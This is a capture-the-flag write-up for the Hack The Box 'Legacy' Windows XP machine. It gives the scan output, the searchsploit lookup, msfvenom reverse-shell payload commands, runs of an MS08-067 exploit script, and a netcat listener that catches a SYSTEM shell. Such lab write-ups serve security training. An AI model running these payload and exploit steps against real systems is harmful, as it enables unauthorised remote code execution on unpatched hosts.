# Legacy 

![Legacy](https://raw.githubusercontent.com/md415/htb/master/legacy/profile.JPG)


## Summary

* Windows XP w/ SMB exposed
* Quick internet search shows the history with Shadow Brokers related exploits (i.e. EternalBlue, EclipsedWing)
* Multiple Python scripts are available to send a payload and get the reverse shell




## Tools needed

* Python w/ Impacket and PyCrypto modules
* msfvenom
* searchsploit
* nc




## Detection 

Start with nmap as usual.  Trying the `--script *vuln*` option to list common vulnerabilities.

```
# nmap -sV --script *vuln* -oA nmap 10.10.10.4                                                                                                                                   [166/186]
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 20:55 CDT                                                                                                                               
Nmap scan report for 10.10.10.4                                                                                            
Host is up (0.051s latency).                                                                                               
Not shown: 997 filtered ports                                                                                              
PORT     STATE  SERVICE       VERSION                                                                                      
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn                                                                
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds                                                            
3389/tcp closed ms-wbt-server                                                                                              
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp                                                                                            
                                                                                                                           
Host script results:                                                                                                       
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                                        
| smb-vuln-cve2009-3103:                                                                                                   
|   VULNERABLE:                                                                                                            
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)                                                      
|     State: VULNERABLE                                      
|     IDs:  CVE:CVE-2009-3103                                
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,          
|           aka "SMBv2 Negotiation Vulnerability."                                                                         
|                                                            
|     Disclosure date: 2009-09-08                                                                                          
|     References:                                                                                                          
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103                                 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103                                                       
| smb-vuln-ms08-067: 
|   VULNERABLE:                                              
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)                                                                                                                   
|     State: LIKELY VULNERABLE                                                                 
|     IDs:  CVE:CVE-2008-4250                  
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,                                                                                        
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary                                                                                      
|           code via a crafted RPC request that triggers the overflow during path canonicalization.                                                                                           
|                                              
|     Disclosure date: 2008-10-23                                                              
|     References:                              
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250                                                                                                                          
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx                                                                                                                    
|_smb-vuln-ms10-054: false                     
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)                                                                                                                         
| smb-vuln-ms17-010:                           
|   VULNERABLE:                                
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                                                                                                 
|     State: VULNERABLE                        
|     IDs:  CVE:CVE-2017-0143                  
|     Risk factor: HIGH                        
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                                                                                              
|        servers (ms17-010).                   
|                                              
|     Disclosure date: 2017-03-14                                                              
|     References:                              
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                                                                                                    
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                                                                                                          
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/     
```

The first vulnerability for an RCE is MS08-067 related.  Let's start there:

```
# searchsploit ms08-067
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                                                       | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                                                        | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                                                  | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                                                   | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                                                                              | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                                                              | windows/remote/7132.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```




## Exploit attempt #1

Multiple RCE's available.  Let's try the first Python one, `windows/remote/40279.py`

```
# searchsploit -m 40279
  Exploit: Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)
      URL: https://www.exploit-db.com/exploits/40279
     Path: /usr/share/exploitdb/exploits/windows/remote/40279.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/htb/legacy/40279.py
```

Executing `python 40279.py` shows some missing depedencies of Impacket and PyCrypto.  Install with Pip.

```
# pip install Impacket
# pip install PyCrypto
```

Checking the file, we need to generate our unique payload.  

```
# grep msfvenom 40279.py 
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

```

Seems simple enough.  Fire up msfvenom.

```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python                                                
```

The msfvenom ouptut is in an array called buf[], but the Python script uses shellcode[]. Search and replace to use buf[].  
Okay, ready to execute and listen for incoming traffic on local port 443 with netcat.

```
# grep Example 40279.py 
                                print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
                                print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

# python 40279.py 10.10.10.4 1

#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#######################################################################

Windows XP SP0/SP1 Universal

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

------------------------------------------------------------------------------------------------------

# nc -nvlp 443
listening on [any] 443 ...
```

The exploit finished, but I see nothing on port 443.  Let's check the options again.

```
# grep -B1 "Windows XP" 40279.py 
        if (self.os=='1'):
                print 'Windows XP SP0/SP1 Universal\n'
--
        elif (self.os=='5'):
                print 'Windows XP SP3 French (NX)\n'
--
        elif (self.os=='6'):
                print 'Windows XP SP3 English (NX)\n'
--
        elif (self.os=='7'):
                print 'Windows XP SP3 English (AlwaysOn NX)\n'
--

                                print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
```


Oh, I forgot the check the OS version with nmap.  Checking now.

```
# nmap -O 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 21:44 CDT
Nmap scan report for 10.10.10.4
Host is up (0.042s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 Server (89%)
No exact OS matches for host (test conditions non-ideal).
```

No exact match, but the aggressive guesses at 92% are either
- Microsoft Windows XP SP2 or Windows Small Business Server 2003
- Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3

SP2 isn't listed as an opton.  Tried options 6 and 7 for SP3, but no luck.  I'm getting nowhere.




## Exploit attempt #2

Scrapping this script, I hit Google: "MS08-67 Python SP2 SP3"

Came across a few versions, but one was updated fairly recently in mid 2018.
https://github.com/andyacer/ms08_067


Here the options for ms08_067_2018.py are a bit different:

```
# git clone https://github.com/andyacer/ms08_067/git
# grep "Example:" ms08_067_2018.py 
                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
```

And of course we need to generate a payload.

```
# grep msfvenom ms08_067_2018.py 

# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Generating the payload:

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

After adding the new payload to the script, we're ready to execute.  Let's try option 6 for SP3 English:

```
# python ms08_067_2018.py 10.10.10.4 6 445                                                                                                                                               
#######################################################################
#   MS08-067 Exploit                                                                                                                                                                         
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).                                                                                         
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#                                      
#   Mod in 2018 by Andy Acer:          
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport        
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste                                                                                                  
#     into this source file.                                                                                                                                                                 
#######################################################################                                                                                                                      
                                                                                                                                                                                             
Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

------------------------------------------------------------------------------------------------------

# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.4] 1028
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>   
C:\WINDOWS\system32>net user
net user                                                                                      
                                                                                              
User accounts for \\                                                                          
-------------------------------------------------------------------------------
Administrator            Guest                    HelpAssistant            
john                     SUPPORT_388945a0          
The command completed with one or more errors.

```

There we go.  A reverse shell is available on 443.  cd to C:\Documents and Settings\john for his flag.

## Privilege Escalation

None.  The Administrator flag is up for grabs.





